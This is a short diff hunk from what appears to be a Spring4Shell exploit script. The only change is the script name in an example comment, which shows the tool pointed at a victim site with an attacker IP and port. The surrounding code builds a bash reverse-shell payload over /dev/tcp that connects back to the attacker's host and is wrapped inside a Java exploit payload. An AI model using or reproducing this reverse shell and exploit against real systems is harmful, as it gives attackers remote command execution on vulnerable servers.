@@ -29,7 +29,7 @@ class Spring4Shell:
 
 
         # This is the reverse shell. You'll set the IP to your host IP, and the port to your host's port.
-        # Example: python3 spring4shell.py hxxps://www.victimsite.com 13.33.33.37 4443
+        # Example: python3 jerry-springer.py hxxps://www.victimsite.com 13.33.33.37 4443
         self.reverse_shell = f"bash -i >&/dev/tcp/{self.args.lhost}/{self.args.port} 0>&1"
 
         # This is the CMD payload that we wrap inside of the Java payload.
